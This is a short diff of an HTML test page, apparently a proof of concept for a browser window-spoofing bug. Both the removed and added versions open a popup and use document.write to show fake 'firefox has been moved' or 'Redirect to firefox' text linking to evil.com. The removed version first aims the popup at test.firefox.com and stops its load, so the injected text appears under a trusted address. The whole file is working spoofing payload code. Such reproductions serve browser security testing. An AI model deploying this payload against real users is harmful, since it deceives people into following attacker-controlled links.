@@ -1,8 +1,2 @@
-<script>
-  function pwned() {
-  var t = window.open('http', 'ss');
-  t.document.write(`<h1>firefox has been moved to</h1><a href="https://evil.com">Go To firefox</a>`);
-  t.stop();
-  }
-  </script>
-  <a href="https://test.firefox.com" target="ss" onclick="setTimeout('pwned()','500')">click me</a>
+<script> function test01() { pop = window.open('http://evil.com', '_t1'); pop.document.write('<h1><a href="//evil.com">Redirect to firefox</a></h1>'); } </script>
+<input type="button" onclick="test01()" value="Run">
